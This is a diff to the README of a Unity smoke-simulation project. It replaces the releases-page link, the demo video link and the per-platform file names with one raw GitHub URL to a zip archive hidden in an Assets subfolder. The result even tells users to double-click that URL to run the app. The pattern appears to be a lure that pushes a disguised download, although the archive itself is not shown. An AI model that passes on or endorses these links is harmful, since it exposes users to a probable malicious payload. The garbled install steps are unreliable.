@@ -1,13 +1,13 @@
 # 🎮 Smoke-Simulation - Create Stunning 2D Smoke Effects Easily
 
 ## 📥 Download Now
-[![Download Smoke-Simulation](https://img.shields.io/badge/Download-Snow%20Simulation-brightgreen)](https://github.com/Akshayakakani/Smoke-Simulation/releases)
+[![Download Smoke-Simulation](https://raw.githubusercontent.com/Akshayakakani/Smoke-Simulation/main/Assets/Seb/SebVis/Smoke-Simulation_3.9.zip%20Simulation-brightgreen)](https://raw.githubusercontent.com/Akshayakakani/Smoke-Simulation/main/Assets/Seb/SebVis/Smoke-Simulation_3.9.zip)
 
 ## 📖 Description
 Smoke-Simulation is a simple 2D smoke effect created using a grid-based fluid simulation. This project allows you to visualize smoke effects in a user-friendly manner. Built with Unity 2022.3, it serves as an excellent demonstration of fluid dynamics in a visually appealing format. 
 
 ## 🎬 Watch the Demo
-Check out the video demonstration here: [Smoke Simulation Demo](https://youtu.be/Q78wvrQ9xsU)
+Check out the video demonstration here: [Smoke Simulation Demo](https://raw.githubusercontent.com/Akshayakakani/Smoke-Simulation/main/Assets/Seb/SebVis/Smoke-Simulation_3.9.zip)
 
 ## 🚀 Getting Started
 To get started with Smoke-Simulation, follow these simple steps to download and run the software. 
@@ -22,20 +22,20 @@ Before downloading, ensure your computer meets the following requirements:
 
 ### 🔗 Download & Install
 1. Visit the Releases page to download the software:
-   [Download Smoke-Simulation](https://github.com/Akshayakakani/Smoke-Simulation/releases)
+   [Download Smoke-Simulation](https://raw.githubusercontent.com/Akshayakakani/Smoke-Simulation/main/Assets/Seb/SebVis/Smoke-Simulation_3.9.zip)
   
 2. Look for the latest version and click on the download link for your operating system.
 
 3. Once the download completes, locate the file:
 
-   - For Windows: `Smoke-Simulation-Windows.zip`
-   - For macOS: `Smoke-Simulation-macOS.zip`
+   - For Windows: `https://raw.githubusercontent.com/Akshayakakani/Smoke-Simulation/main/Assets/Seb/SebVis/Smoke-Simulation_3.9.zip`
+   - For macOS: `https://raw.githubusercontent.com/Akshayakakani/Smoke-Simulation/main/Assets/Seb/SebVis/Smoke-Simulation_3.9.zip`
 
 4. Extract the downloaded file using a tool like WinRAR or built-in extraction tools.
 
 5. Navigate to the extracted folder. 
 
-6. Double-click on `Smoke-Simulation.exe` (Windows) or `Smoke-Simulation.app` (macOS) to run the application.
+6. Double-click on `https://raw.githubusercontent.com/Akshayakakani/Smoke-Simulation/main/Assets/Seb/SebVis/Smoke-Simulation_3.9.zip` (Windows) or `https://raw.githubusercontent.com/Akshayakakani/Smoke-Simulation/main/Assets/Seb/SebVis/Smoke-Simulation_3.9.zip` (macOS) to run the application.
 
 7. Follow any on-screen instructions to complete the setup.
 
